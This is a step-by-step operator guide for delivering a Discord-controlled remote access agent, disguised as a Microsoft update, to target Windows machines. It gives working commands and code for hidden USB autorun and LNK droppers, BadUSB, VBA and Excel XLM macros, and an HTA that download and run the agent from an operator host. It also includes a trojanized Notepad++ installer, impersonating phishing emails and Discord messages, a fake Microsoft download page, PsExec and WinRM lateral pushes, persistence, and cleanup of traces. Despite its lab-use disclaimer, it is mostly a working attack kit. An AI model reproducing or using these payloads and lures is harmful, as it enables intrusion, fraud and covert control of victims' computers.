# ART — Delivery Vectors Testing Guide

> **Authorized lab use only.** For security training and authorized red team engagements only.

---

## How to use this guide

Each vector is a self-contained checklist:
- **What you need** — tools and files required before you start
- **Steps** — numbered actions, one per line, in order
- **✅ How to confirm it worked** — what success looks like

> **Legend for code blocks:**
> - `CMD` → open Command Prompt (`Win+R` → type `cmd` → Enter)
> - `PowerShell` → open PowerShell (`Win+R` → type `powershell` → Enter)
> - `Save as file` → create a new text file with that exact name and paste the contents
> - `Type into cell` → click the cell in Excel/Word and type directly

---

## FIRST: Build the EXE (do this once before testing any vector)

**What you need:** Python 3.13 installed, ART folder open in CMD.

**Steps:**

1. Open CMD and navigate to your ART folder:
   ```cmd
   cd C:\path\to\ART
   ```

2. Run setup (first time only — skip if already done):
   ```cmd
   build.bat setup
   ```

3. Build the agent EXE with a convincing icon and name:
   ```cmd
   build.bat --icon "Windows Defender.ico" --name "WindowsUpdate" --version 4.18.2405.7 --company "Microsoft Corporation" --product "Microsoft Defender Antivirus"
   ```

4. Confirm the output file exists:
   ```cmd
   dir build\WindowsUpdate.exe
   ```

✅ **Confirm:** You see `build\WindowsUpdate.exe` listed with a file size. Right-click it in Explorer → Properties → Details → shows "Microsoft Corporation" as company.

---

## Vector 1A — USB Drop (Manual, no autorun)

Simplest vector. Target sees the file and double-clicks it.

**What you need:**
- USB drive (any size)
- Built `WindowsUpdate.exe`
- A decoy PDF (any PDF renamed to `IT_Notice.pdf`)

**Steps:**

1. Plug in USB drive. Note the drive letter (e.g., `E:`).

2. In CMD, set the USB label:
   ```cmd
   label E: "IT Tools"
   ```

3. Copy the agent to the USB with a convincing filename:
   ```cmd
   copy build\WindowsUpdate.exe "E:\Windows_Security_Patch_KB5040442.exe"
   ```

4. Copy a decoy file to make the drive look legitimate:
   ```cmd
   copy "C:\path\to\IT_Notice.pdf" "E:\"
   ```

5. Plug the USB into the target machine. Tell them: *"IT asked me to drop this off — it's a required security patch."*

6. Target double-clicks `Windows_Security_Patch_KB5040442.exe`.

✅ **Confirm:** A new channel appears in your Discord server under VICTIMS named `cmd-<hostname>-<id>`. Run `!whoami` in that channel.

---

## Vector 1B — USB AutoRun (Legacy Windows XP–7, Stealth)

The EXE runs automatically when the USB is inserted. Both files are hidden from the target.

**What you need:**
- USB drive
- Built `WindowsUpdate.exe`
- A decoy PDF

**Steps:**

1. Plug in USB. Note drive letter (e.g., `E:`).

2. Set volume label:
   ```cmd
   label E: "Microsoft Update"
   ```

3. Copy the EXE to USB:
   ```cmd
   copy build\WindowsUpdate.exe E:\WindowsUpdate.exe
   ```

4. Copy decoy PDF:
   ```cmd
   copy "C:\path\to\IT_Notice.pdf" "E:\"
   ```

5. Create `autorun.inf` and hide it. Paste this entire block into CMD at once:
   ```cmd
   (
     echo [autorun]
     echo open=WindowsUpdate.exe
     echo action=Install Security Update KB5040442
     echo label=Microsoft Update
     echo icon=WindowsUpdate.exe
     echo shellexecute=WindowsUpdate.exe
     echo shell\open\command=WindowsUpdate.exe
   ) > E:\autorun.inf
   attrib +h +s E:\autorun.inf
   attrib +h +s E:\WindowsUpdate.exe
   ```

6. Verify the target only sees the decoy:
   ```cmd
   dir E:\ /a:-h-s
   ```
   > Output should show **only** the PDF. If you see `autorun.inf` or `WindowsUpdate.exe`, the `attrib` step didn't work — repeat step 5.

7. Plug USB into target. On Windows XP–7 the agent runs automatically. On Windows 8+ the AutoPlay dialog appears — target clicks *"Install Security Update KB5040442"*.

✅ **Confirm:** New Discord channel appears. Run `!whoami`.

---

## Vector 1C — USB LNK Trick (Windows 8–11, Stealth)

Target sees what looks like a "Documents" folder. Clicking it runs the agent silently. The real EXE is hidden.

**What you need:**
- USB drive
- Built `WindowsUpdate.exe` (will be renamed to `svchost.exe` on the USB)
- A decoy PDF

**Steps:**

1. Save the following as `prep_usb.bat` inside your ART folder:
   ```bat
   @echo off
   set DRIVE=%1
   if "%DRIVE%"=="" (echo Usage: prep_usb.bat E: & exit /b 1)
   echo [1/6] Setting label...
   label %DRIVE% "Microsoft Update"
   echo [2/6] Creating hidden folder...
   mkdir %DRIVE%\sys 2>nul
   attrib +h +s %DRIVE%\sys
   echo [3/6] Copying agent...
   copy build\WindowsUpdate.exe %DRIVE%\sys\svchost.exe >nul
   attrib +h +s %DRIVE%\sys\svchost.exe
   echo [4/6] Writing autorun.inf...
   (echo [autorun] & echo open=sys\svchost.exe & echo action=Install Security Update KB5040442 & echo label=Microsoft Update & echo icon=sys\svchost.exe & echo shellexecute=sys\svchost.exe) > %DRIVE%\autorun.inf
   attrib +h +s %DRIVE%\autorun.inf
   echo [5/6] Copying decoy...
   copy "C:\path\to\IT_Notice.pdf" %DRIVE%\ >nul
   echo [6/6] Creating folder shortcut...
   powershell -NoProfile -Command "$s=New-Object -ComObject WScript.Shell;$l=$s.CreateShortcut('%DRIVE%\Documents.lnk');$l.TargetPath='C:\Windows\System32\cmd.exe';$l.Arguments='/c start /b %%~dp0sys\svchost.exe';$l.WorkingDirectory='%DRIVE%\';$l.IconLocation='%%SystemRoot%%\System32\shell32.dll,3';$l.Description='Documents';$l.WindowStyle=7;$l.Save()"
   echo.
   echo === Target sees (should be only LNK + PDF): ===
   dir %DRIVE%\ /a:-h-s
   echo.
   echo === Full view (your view): ===
   dir %DRIVE%\ /a
   pause
   ```
   > Edit line 14 to point to your actual decoy PDF path.

2. Build EXE:
   ```cmd
   build.bat --icon "Windows Defender.ico" --name "WindowsUpdate"
   ```

3. Plug in USB and run the prep script:
   ```cmd
   prep_usb.bat E:
   ```

4. Read the output. "Target sees" section should show **only** `Documents.lnk` and the PDF.

5. Plug USB into target. Target opens the drive, sees a "Documents" folder, clicks it.

✅ **Confirm:** No CMD window visible on target. New Discord channel appears. Run `!whoami`.

---

## Vector 1D — USB HID / BadUSB (No user interaction)

A programmable USB device acts as a keyboard and types commands automatically on insertion.

**What you need:**
- Rubber Ducky, Flipper Zero, or similar HID device
- HTTP server running (see Vector 4A) — OR EXE on the USB mass storage partition

**Steps:**

1. Save the following as `payload.txt` — flash it to your HID device.

   **Option A — downloads from your server (recommended):**
   ```
   DELAY 2000
   GUI r
   DELAY 500
   STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://<ngrok_url>/WindowsUpdate.exe' -OutFile $env:TEMP\WU.exe; Start-Process $env:TEMP\WU.exe"
   ENTER
   DELAY 1000
   ```

   **Option B — runs from the USB itself (no internet needed):**
   ```
   DELAY 2000
   GUI r
   DELAY 500
   STRING cmd /c start /b D:\sys\svchost.exe
   ENTER
   ```
   > Change `D:` if your USB gets a different letter on the target.

2. If using Option A: start your HTTP server first (Vector 4A steps).

3. If using Option B: run `prep_usb.bat` first (Vector 1C steps) to stage the EXE.

4. Insert HID device into target. It types within 2–3 seconds. Remove it immediately.

✅ **Confirm:** New Discord channel appears within 30–60 seconds. Run `!whoami`.

---

## Vector 2A — Email Phishing (Password-Protected ZIP)

Target receives an email with a ZIP attachment. They extract and run the EXE.

**What you need:**
- [7-Zip](https://www.7-zip.org/) installed on your operator machine
- Built `WindowsUpdate.exe`
- An email account to send from

**Steps:**

1. Create the password-protected ZIP in CMD:
   ```cmd
   7z a -p"Update2024" -mhe=on "Security_Update_KB5040442.zip" "build\WindowsUpdate.exe"
   ```
   > `-mhe=on` hides the filename inside the ZIP from scanners.

2. Compose the email using Template 1 below. Fill in the blanks:

   ```
   Subject: [ACTION REQUIRED] Critical Security Patch — Please Install by EOD

   Hi [First Name],

   Our security team has identified a vulnerability on endpoints that have
   not received the latest Defender update (KB5040442). Your machine appears
   to be affected.

   Please download and install the attached patch immediately. The process
   takes less than 2 minutes and runs silently in the background.

       Archive password: Update2024

   If you have any questions, contact the IT helpdesk at ext. 1337.

   Thanks,
   Michael Torres
   IT Security Operations
   ```

3. Attach `Security_Update_KB5040442.zip` to the email.

4. Send to target.

5. Target extracts the ZIP (password: `Update2024`) and double-clicks `WindowsUpdate.exe`.

✅ **Confirm:** New Discord channel appears. Run `!whoami`.

---

## Vector 2B — Email Phishing (ISO Attachment — bypasses SmartScreen)

ISO files bypass Windows SmartScreen. Files inside don't get flagged as downloaded from the internet.

**What you need:**
- Built `WindowsUpdate.exe`
- PowerShell on operator machine (built into Windows)

**Steps:**

1. Save the following as `make_iso.ps1` in your ART folder:
   ```powershell
   # make_iso.ps1 — run from your ART folder
   $exePath = "build\WindowsUpdate.exe"
   $isoPath = "Security_Update.iso"
   $volName = "Microsoft Security"

   $staging = "$env:TEMP\iso_stage"
   New-Item -ItemType Directory -Path $staging -Force | Out-Null
   Copy-Item $exePath "$staging\WindowsUpdate.exe"

   $fsi = New-Object -ComObject IMAPI2FS.MsftFileSystemImage
   $fsi.FileSystemsToCreate = 4
   $fsi.VolumeName = $volName
   $fsi.Root.AddTreeWithNamedStreams($staging, $false)

   $istream = $fsi.CreateResultImage().ImageStream
   $w = New-Object -ComObject ADODB.Stream
   $w.Type = 1; $w.Open()
   $w.Write($istream.Read($fsi.FreeMediaBlocks * 2048))
   $w.SaveToFile((Resolve-Path ".").Path + "\$isoPath", 2)
   $w.Close()
   Remove-Item $staging -Recurse -Force
   Write-Host "Done: $isoPath"
   ```

2. Run it in PowerShell from your ART folder:
   ```powershell
   .\make_iso.ps1
   ```

3. Confirm `Security_Update.iso` was created in your ART folder:
   ```cmd
   dir Security_Update.iso
   ```

4. Send `Security_Update.iso` as an email attachment with the body from Template 1 (Vector 2A).

5. Target double-clicks the ISO → Windows mounts it → they see `WindowsUpdate.exe` → double-click → agent runs.

✅ **Confirm:** New Discord channel appears. No SmartScreen warning shown to target.

---

## Vector 3 — Shared Folder (Network Share)

You copy the EXE to a network share and socially engineer the target to run it.

**What you need:**
- Network access to a share the target can reach
- Built `WindowsUpdate.exe`

**Steps:**

1. Copy EXE to the share (replace the path with a real share the target can access):
   ```cmd
   copy build\WindowsUpdate.exe "\\FILESERVER\Software\Microsoft\Update\WindowsUpdate.exe"
   ```

2. Send the target an internal chat message or email:
   ```
   Hi [Name], can you run the IT compliance tool I just put on the
   software share? It's quick — should take under a minute.

   \\FILESERVER\Software\Microsoft\Update\WindowsUpdate.exe
   ```

3. If you have admin share access and want to push + run without user interaction:
   ```cmd
   xcopy /Y /Q build\WindowsUpdate.exe "\\TARGET\C$\Users\Public\WindowsUpdate.exe"
   ```
   Then create a temporary service to execute it:
   ```cmd
   sc \\TARGET create ARTSvc binPath= "C:\Users\Public\WindowsUpdate.exe" start= auto
   sc \\TARGET start ARTSvc
   ```

4. After agent connects, clean up the service:
   ```cmd
   sc \\TARGET stop ARTSvc
   sc \\TARGET delete ARTSvc
   ```

✅ **Confirm:** New Discord channel appears. Run `!whoami`. Then run `!persist setup`.

---

## Vector 4A — Web Drive-By (HTTPS via ngrok — recommended)

The cleanest lab setup. ngrok gives you a real public `https://` URL in under a minute — no domain, no VPS, no certificate warnings for the target.

**What you need:**
- Python 3 on your operator machine
- ngrok — download from [ngrok.com/download](https://ngrok.com/download), unzip it, and add to PATH
- Built `WindowsUpdate.exe`
- Your operator machine's IP address (`ipconfig` in CMD)

**Steps:**

1. Set up the serve folder with a convincing URL path:
   ```cmd
   mkdir serve\Microsoft\Security\Update
   copy build\WindowsUpdate.exe serve\Microsoft\Security\Update\
   ```

2. Start the HTTP server (keep this CMD window open):
   ```cmd
   cd serve
   python -m http.server 8080
   ```

3. Open a **second** CMD window and start ngrok:
   ```cmd
   ngrok http 8080
   ```

4. ngrok prints a forwarding URL like:
   ```
   Forwarding  https://abc123.ngrok-free.app -> http://localhost:8080
   ```

5. Your payload URL is:
   ```
   https://abc123.ngrok-free.app/Microsoft/Security/Update/WindowsUpdate.exe
   ```

6. Send this link to the target via email, chat, or embed it in the lure page (next vector).

✅ **Confirm:** You see a GET request in both the ngrok and HTTP server windows. New Discord channel appears.

---

## Vector 4B — Web Drive-By with Lure Page (HTTPS)

Adds a fake Microsoft-styled download page so the target sees something convincing. Combine with ngrok from Vector 4A for a clean HTTPS URL.

**What you need:**
- ngrok + Python HTTP server already running from Vector 4A (steps 1–4 done)

**Steps:**

1. Save the following as `serve\index.html`:
   ```html
   <!DOCTYPE html>
   <html lang="en">
   <head>
     <meta charset="UTF-8">
     <title>Microsoft Security Update</title>
     <style>
       body { font-family: "Segoe UI", sans-serif; background: #f3f3f3;
              display: flex; justify-content: center; align-items: center;
              height: 100vh; margin: 0; }
       .card { background: white; border-radius: 4px; padding: 40px 50px;
               box-shadow: 0 2px 8px rgba(0,0,0,.15); max-width: 420px; text-align: center; }
       .logo { font-size: 28px; color: #0067b8; font-weight: 600; margin-bottom: 8px; }
       p { color: #444; line-height: 1.6; }
       .note { font-size: 12px; color: #888; margin-top: 20px; }
     </style>
     <script>
       setTimeout(function() {
         window.location.href = "/Microsoft/Security/Update/WindowsUpdate.exe";
       }, 1500);
     </script>
   </head>
   <body>
     <div class="card">
       <div class="logo">🛡 Microsoft Security</div>
       <h2 style="font-weight:400">Security Update Required</h2>
       <p>A critical security update (KB5040442) is being downloaded for your device.
          Please run the installer once it completes.</p>
       <p><b>Your download will start automatically...</b></p>
       <div class="note">Microsoft Corporation · Privacy · Terms of Use</div>
     </div>
   </body>
   </html>
   ```

2. The HTTP server is already running from `serve\` (Vector 4A step 2).

3. Send the target the **root ngrok URL** (no file path):
   ```
   https://abc123.ngrok-free.app/
   ```

4. Target visits the page → sees the Microsoft update screen → download triggers automatically after 1.5 seconds.

✅ **Confirm:** Two GET requests in the server window (one for `/`, one for the EXE). New Discord channel appears.

---

## Vector 4C — Local Network HTTPS (Self-Signed Cert)

Use this when you want HTTPS on your local network without ngrok — for example when the target is on the same LAN and you don't want to tunnel through an external service.

**What you need:**
- Python 3 and OpenSSL on your operator machine (OpenSSL comes with Git for Windows)
- Built `WindowsUpdate.exe`

**Steps:**

1. Set up the serve folder:
   ```cmd
   mkdir serve\Microsoft\Security\Update
   copy build\WindowsUpdate.exe serve\Microsoft\Security\Update\
   ```

2. Generate a self-signed certificate (do once — run in CMD inside your ART folder):
   ```cmd
   openssl req -x509 -newkey rsa:2048 -keyout serve\key.pem -out serve\cert.pem -days 365 -nodes -subj "/CN=update.microsoft.com"
   ```

3. Save the following as `serve\https_server.py`:
   ```python
   # https_server.py — run from inside the serve\ folder
   import ssl, http.server, os
   os.chdir(os.path.dirname(os.path.abspath(__file__)))
   httpd = http.server.HTTPServer(("0.0.0.0", 443), http.server.SimpleHTTPRequestHandler)
   ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
   ctx.load_cert_chain("cert.pem", "key.pem")
   httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
   print("Serving HTTPS on port 443 — Ctrl+C to stop")
   httpd.serve_forever()
   ```

4. Run the HTTPS server (requires admin for port 443 on Windows):
   ```cmd
   python serve\https_server.py
   ```

5. Find your local IP:
   ```cmd
   ipconfig
   ```
   Look for `IPv4 Address` — e.g., `192.168.1.50`

6. Your payload URL (browser will show an untrusted cert warning — target clicks "Advanced → Proceed"):
   ```
   https://192.168.1.50/Microsoft/Security/Update/WindowsUpdate.exe
   ```

> For zero cert warnings, use ngrok (Vector 4A) instead — it provides a valid trusted certificate automatically.

✅ **Confirm:** GET request in the server window. New Discord channel appears.

---

## Vector 5A — Word Macro (Download & Run)

A Word `.docm` file that downloads and runs the agent when opened.

**What you need:**
- Microsoft Word installed on your operator machine
- HTTP server running (Vector 4A)
- Built `WindowsUpdate.exe` being served

**Steps:**

1. Open Microsoft Word → File → New → Blank Document.

2. File → Save As → change file type to `Word Macro-Enabled Document (*.docm)` → save as `Invoice_October.docm`.

3. Press `Alt + F11` to open the VBA editor.

4. In the left panel, find your document name → expand it → double-click `ThisDocument`.

5. Delete all existing code in that window, then paste this entire block:
   ```vba
   Private Sub Document_Open()
       Dim url  As String
       Dim dest As String
       url  = "https://<ngrok_url>/Microsoft/Security/Update/WindowsUpdate.exe"
       dest = Environ("TEMP") & "\WUpdate.exe"
       Dim ps As String
       ps = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
            """(New-Object Net.WebClient).DownloadFile('" & url & "','" & dest & "');" & _
            "Start-Process '" & dest & "' -WindowStyle Hidden"""
       CreateObject("WScript.Shell").Run ps, 0, False
   End Sub
   ```
   > Replace `<your_ip>` with your operator machine IP from `ipconfig`.

6. Close the VBA editor: click the **X** on the VBA editor window only (not Word itself).

7. Back in the document, type some convincing content — e.g., *"This document is protected. Click Enable Content to view."*

8. Press `Ctrl+S` to save.

9. Send `Invoice_October.docm` to target via email or shared folder.

10. Target opens it → clicks "Enable Content" → macro fires → agent downloads and runs silently.

✅ **Confirm:** GET request appears in your HTTP server window. New Discord channel appears.

---

## Vector 5B — Excel XLM Macro (Lower AV Detection)

An Excel file using old-style XLM macros. Many AV engines don't detect these.

**What you need:**
- Microsoft Excel installed
- HTTP server running (Vector 4A)

**Steps:**

1. Open Microsoft Excel → new blank workbook.

2. Right-click the sheet tab at the bottom of the screen → click `Insert`.

3. Select `MS Excel 4.0 Macro` → click OK. A new sheet named `Macro1` appears.

4. Click on cell `A1` in `Macro1` sheet. Type this exactly (replace `<your_ip>`):
   ```
   =EXEC("powershell -w hidden -c (New-Object Net.WebClient).DownloadFile('http://<your_ip>:8080/Microsoft/Security/Update/WindowsUpdate.exe',$env:TEMP+'\WU.exe');Start-Process ($env:TEMP+'\WU.exe')")
   ```
   Press Enter when done.

5. Click on cell `A2`. Type:
   ```
   =HALT()
   ```
   Press Enter.

6. Click back on cell `A1`. Look at the top-left Name Box (it currently shows `A1`). Click inside it, type `Auto_Open`, press Enter.

7. File → Save As → choose `Excel Macro-Enabled Workbook (*.xlsm)` → save as `Q3_Report.xlsm`.

8. Send to target. Target opens it → clicks Enable Content → agent runs.

✅ **Confirm:** GET request in HTTP server. New Discord channel appears.

---

## Vector 6A — Remote Shell (SCP + SSH)

You already have SSH access to the target. Copy and execute silently.

**What you need:**
- SSH access to target (username + password or key)
- Target IP address
- Built `WindowsUpdate.exe`

**Steps:**

1. Copy the EXE to the target over SCP:
   ```cmd
   scp build\WindowsUpdate.exe user@192.168.1.100:"C:/Users/Public/WUpdate.exe"
   ```
   Enter password when prompted.

2. Execute it remotely over SSH:
   ```cmd
   ssh user@192.168.1.100 "powershell -WindowStyle Hidden -Command Start-Process C:\\Users\\Public\\WUpdate.exe"
   ```

✅ **Confirm:** New Discord channel appears within 30 seconds.

---

## Vector 6B — PowerShell Remoting (WinRM)

Push and run the agent on a Windows target using built-in PowerShell remoting.

**What you need:**
- Admin credentials for the target machine
- WinRM enabled on target (default on Windows Server; enable on Win10/11 with `Enable-PSRemoting -Force`)
- Target hostname or IP

**Steps:**

1. Open PowerShell on your operator machine.

2. Create a remote session (you'll be prompted for credentials):
   ```powershell
   $sess = New-PSSession -ComputerName 192.168.1.100 -Credential (Get-Credential)
   ```

3. Copy the EXE to the target:
   ```powershell
   Copy-Item -Path ".\build\WindowsUpdate.exe" -Destination "C:\Users\Public\WUpdate.exe" -ToSession $sess
   ```

4. Execute it remotely:
   ```powershell
   Invoke-Command -Session $sess -ScriptBlock {
       Start-Process "C:\Users\Public\WUpdate.exe" -WindowStyle Hidden
   }
   ```

5. After agent connects to Discord and you've run `!persist setup`, clean up:
   ```powershell
   Invoke-Command -Session $sess -ScriptBlock { Remove-Item "C:\Users\Public\WUpdate.exe" -Force }
   Remove-PSSession $sess
   ```

✅ **Confirm:** New Discord channel appears. Run `!persist setup` before closing the session.

---

## Vector 6C — RDP with Drive Sharing

Transfer via RDP file sharing. No credentials beyond what RDP requires.

**What you need:**
- RDP access to target (username + password)
- Target IP address

**Steps:**

1. Open Run dialog (`Win+R`) → type `mstsc` → Enter.

2. Enter target IP → click `Show Options`.

3. Go to `Local Resources` tab → click `More...` → expand `Drives` → check your local `C:` drive → click OK.

4. Click `Connect` and log in.

5. Inside the RDP session, open File Explorer. Under `This PC` you'll see your local drive listed as `C on <your_hostname>`.

6. Navigate to your ART `build` folder through that redirected drive.

7. Copy `WindowsUpdate.exe` to the target desktop or `C:\Users\Public\`.

8. Double-click it.

✅ **Confirm:** New Discord channel appears.

---

## Vector 6D — PsExec (Admin Share)

One-command push and execute. Requires admin credentials.

**What you need:**
- [PsExec](https://learn.microsoft.com/en-us/sysinternals/downloads/psexec) downloaded and in PATH
- Admin credentials for target
- Target IP or hostname

**Steps:**

1. In CMD from your ART folder, run:
   ```cmd
   psexec \\192.168.1.100 -u Administrator -p "Password123" -d -c build\WindowsUpdate.exe
   ```
   > `-c` copies the EXE, `-d` runs detached (returns immediately).

✅ **Confirm:** PsExec prints the process ID. New Discord channel appears.

---

## Vector 7 — Discord Phishing

Social engineering via Discord DM or fake server.

**What you need:**
- Discord account with a convincing name (e.g., `IT-Support-Desk`)
- Password-protected ZIP of the agent (Vector 2A step 1)

**Steps:**

1. Create or open a Discord account. Set username and avatar to look like IT support.

2. Create the ZIP payload:
   ```cmd
   7z a -p"Support2024" -mhe=on "ComplianceScan.zip" "build\WindowsUpdate.exe"
   ```

3. Send the following as a Discord DM to the target (fill in their name):
   ```
   Hi [Name],

   I'm reaching out from the IT Security team. We've detected that your
   endpoint is missing the required EDR agent and may lose network access
   by Friday.

   Please run the attached compliance scanner — it takes under 2 minutes
   and fixes this automatically.

       Archive password: Support2024

   Let me know if you have any issues.

   — IT Security Operations
   ```

4. Attach `ComplianceScan.zip` to the DM.

5. Target extracts the ZIP (password: `Support2024`) and runs the EXE.

✅ **Confirm:** New Discord channel appears. Run `!whoami`.

---

## Vector 8 — LNK Shortcut (Email / ISO)

A `.lnk` file that looks like a Word document but runs the agent. Best delivered inside an ISO (bypasses SmartScreen).

**What you need:**
- Built `WindowsUpdate.exe`
- A decoy PDF (rename any PDF to `Q3_Report.pdf`)
- PowerShell on operator machine

**Steps:**

1. Create a folder to stage the ISO contents:
   ```cmd
   mkdir iso_stage
   copy build\WindowsUpdate.exe iso_stage\WindowsUpdate.exe
   copy "C:\path\to\Q3_Report.pdf" iso_stage\
   ```

2. Hide the EXE inside the staging folder:
   ```cmd
   attrib +h +s iso_stage\WindowsUpdate.exe
   ```

3. Save the following as `make_lnk.ps1` in your ART folder and run it in PowerShell:
   ```powershell
   # make_lnk.ps1
   $s = New-Object -ComObject WScript.Shell
   $l = $s.CreateShortcut("$PWD\iso_stage\Q3 Finance Report.lnk")
   $l.TargetPath       = "C:\Windows\System32\cmd.exe"
   $l.Arguments        = "/c start /b %~dp0WindowsUpdate.exe & start %~dp0Q3_Report.pdf"
   $l.IconLocation     = "C:\Windows\System32\shell32.dll,1"
   $l.Description      = "Q3 Finance Report"
   $l.WindowStyle      = 7
   $l.Save()
   Write-Host "LNK created in iso_stage\"
   ```
   Run it:
   ```powershell
   .\make_lnk.ps1
   ```

4. Save the following as `make_iso.ps1` and run it in PowerShell to package into an ISO:
   ```powershell
   # make_iso.ps1
   $staging = "$PWD\iso_stage"
   $isoPath = "$PWD\Q3_Finance_Report.iso"
   $fsi = New-Object -ComObject IMAPI2FS.MsftFileSystemImage
   $fsi.FileSystemsToCreate = 4
   $fsi.VolumeName = "Q3 Finance Reports"
   $fsi.Root.AddTreeWithNamedStreams($staging, $false)
   $w = New-Object -ComObject ADODB.Stream
   $w.Type=1; $w.Open()
   $w.Write($fsi.CreateResultImage().ImageStream.Read($fsi.FreeMediaBlocks*2048))
   $w.SaveToFile($isoPath, 2); $w.Close()
   Write-Host "ISO ready: Q3_Finance_Report.iso"
   ```
   Run it:
   ```powershell
   .\make_iso.ps1
   ```

5. Confirm the ISO was created:
   ```cmd
   dir Q3_Finance_Report.iso
   ```

6. Email `Q3_Finance_Report.iso` to target as an attachment.

7. Target double-clicks the ISO → it mounts → they see `Q3 Finance Report.lnk` (looks like a Word doc) → click it → agent runs silently + decoy PDF opens.

✅ **Confirm:** New Discord channel appears. Target sees and reads the decoy PDF — no suspicion.

---

## Vector 9 — HTA File

An `.hta` file runs as a full trusted application on Windows. Clicking it downloads and runs the agent.

**What you need:**
- HTTP server running (Vector 4A)
- A text editor (Notepad is fine)

**Steps:**

1. Save the following as `SecurityUpdate.hta` — open Notepad, paste, File → Save As → name it `SecurityUpdate.hta`, change Save As Type to `All Files (*.*)`:
   ```html
   <html>
   <head>
     <title>Microsoft Security Update</title>
     <HTA:APPLICATION ID="x" APPLICATIONNAME="Security Update" WINDOWSTATE="normal"/>
     <script language="VBScript">
       Sub Window_onLoad
         Self.ResizeTo 0,0
         Self.MoveTo -2000,-2000
         Dim url  : url  = "https://<ngrok_or_your_ip>/Microsoft/Security/Update/WindowsUpdate.exe"
         Dim dest : dest = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\WU.exe"
         Dim xhr  : Set xhr = CreateObject("Microsoft.XMLHTTP")
         xhr.Open "GET", url, False
         xhr.Send
         Dim s : Set s = CreateObject("ADODB.Stream")
         s.Type=1 : s.Open : s.Write xhr.ResponseBody
         s.SaveToFile dest, 2 : s.Close
         CreateObject("WScript.Shell").Run Chr(34) & dest & Chr(34), 0, False
         Self.Close
       End Sub
     </script>
   </head><body></body>
   </html>
   ```
   > Replace `<ngrok_or_your_ip>` with your ngrok URL (e.g., `abc123.ngrok-free.app`) or local IP.

2. Confirm the filename ends in `.hta` (not `.hta.txt`).

3. Make sure HTTP server is running (Vector 4A).

4. Deliver by one of these methods:
   - **Email:** Put `SecurityUpdate.hta` inside a ZIP → attach to email
   - **Link:** Copy `SecurityUpdate.hta` into your `serve\` folder → send link: `https://<ngrok_url>/SecurityUpdate.hta`
   - **Existing shell:** `mshta.exe https://<ngrok_url>/SecurityUpdate.hta`

5. Target opens/clicks the HTA → it disappears (moves off-screen) → agent downloads and runs silently.

✅ **Confirm:** GET request in HTTP server window. New Discord channel appears.

---

## Vector 10 — Trojanized Installer (NSIS)

A real-looking installer that secretly runs the agent before installing the legitimate app.

**What you need:**
- [NSIS](https://nsis.sourceforge.io/) installed on your operator machine
- Built `WindowsUpdate.exe`
- The real legitimate installer you want to bundle (e.g., `npp.8.6.8.Installer.exe` — download the real one from notepad-plus-plus.org)

**Steps:**

1. Save the following as `trojan.nsi` in your ART folder:
   ```nsis
   !include "MUI2.nsh"
   Name "Notepad++ v8.6.8 Setup"
   OutFile "npp.8.6.8.Installer.exe"
   InstallDir "$PROGRAMFILES\Notepad++"
   RequestExecutionLevel admin
   !insertmacro MUI_PAGE_WELCOME
   !insertmacro MUI_PAGE_DIRECTORY
   !insertmacro MUI_PAGE_INSTFILES
   !insertmacro MUI_PAGE_FINISH
   !insertmacro MUI_LANGUAGE "English"
   Section "Install"
     SetOutPath "$TEMP"
     File "build\WindowsUpdate.exe"
     Exec '"$TEMP\WindowsUpdate.exe"'
     SetOutPath "$INSTDIR"
     File "npp.8.6.8.Installer.exe"
     ExecWait '"$INSTDIR\npp.8.6.8.Installer.exe" /S'
     Delete "$TEMP\WindowsUpdate.exe"
   SectionEnd
   ```

2. Place both `build\WindowsUpdate.exe` AND the real `npp.8.6.8.Installer.exe` in your ART folder.

3. Compile the trojanized installer:
   ```cmd
   makensis trojan.nsi
   ```

4. Send the output `npp.8.6.8.Installer.exe` to target via email, share, or web.

5. Target runs it → sees a real Notepad++ installer → agent runs silently in the background → Notepad++ installs normally.

✅ **Confirm:** Notepad++ installs successfully on target AND new Discord channel appears.

---

## Vector 10A — Self-Extracting Archive (7-Zip SFX)

A single `.exe` that looks like a standard self-extractor but silently runs the agent.

**What you need:**
- [7-Zip](https://www.7-zip.org/) installed
- Built `WindowsUpdate.exe`

**Steps:**

1. Create the archive:
   ```cmd
   7z a payload.7z build\WindowsUpdate.exe
   ```

2. Save the following as `sfx_config.txt` in your ART folder:
   ```
   ;!@Install@!UTF-8!
   Title="Microsoft Teams Installer"
   Progress="no"
   RunProgram="WindowsUpdate.exe"
   ;!@InstallEnd@!
   ```

3. Bundle it into a single EXE:
   ```cmd
   copy /b "C:\Program Files\7-Zip\7z.sfx" + sfx_config.txt + payload.7z "TeamsSetup.exe"
   ```

4. Clean up:
   ```cmd
   del sfx_config.txt payload.7z
   ```

5. Send `TeamsSetup.exe` to target.

6. Target double-clicks → extracts silently → agent runs.

✅ **Confirm:** New Discord channel appears.

---

## After Every Vector — Post-Delivery Checklist

Once the agent connects, do these steps in your Discord channel:

1. **Confirm who you are on the target:**
   ```
   !whoami
   ```

2. **Get full system info:**
   ```
   !sysinfo
   ```

3. **Lock in persistence before doing anything else:**
   ```
   !persist setup
   ```

4. **Clean up the delivery file from the target:**
   ```
   !shell del C:\Users\Public\WUpdate.exe
   !shell del %TEMP%\WU.exe
   !shell del %TEMP%\WindowsUpdate.exe
   ```

5. **Confirm persistence is installed:**
   ```
   !ps
   ```
   Look for your agent process in the list.

---

## Vector 11 — Social Engineering Toolkit (SET) on Kali Linux

SET is built into Kali and automates several phishing and payload delivery scenarios. The key integration point with ART is: **SET generates the lure and handles delivery mechanics — your ART EXE is the payload SET delivers.**

---

### What you need

- Kali Linux machine (physical, VM, or WSL2 with networking)
- SET installed — already included in Kali. Verify with:
  ```bash
  which setoolkit
  ```
  If missing:
  ```bash
  sudo apt update && sudo apt install set -y
  ```
- Built `WindowsUpdate.exe` copied to your Kali machine
- Your Kali machine's IP address:
  ```bash
  ip a | grep inet
  ```

---

### How to start SET

Always run SET as root:

```bash
sudo setoolkit
```

You land at the main menu:
```
1) Social-Engineering Attacks
2) Penetration Testing (Fast-Track)
3) Third Party Modules
4) Update the Social-Engineer Toolkit
99) Exit the Social-Engineer Toolkit
```

---

## SET Vector 11A — Spear-Phishing Email with ART EXE Attachment

SET sends a phishing email with your ART EXE as an attachment directly from Kali.

**What you need:**
- SMTP server access (Gmail app password, SendGrid, or your own SMTP relay)
- Target email address
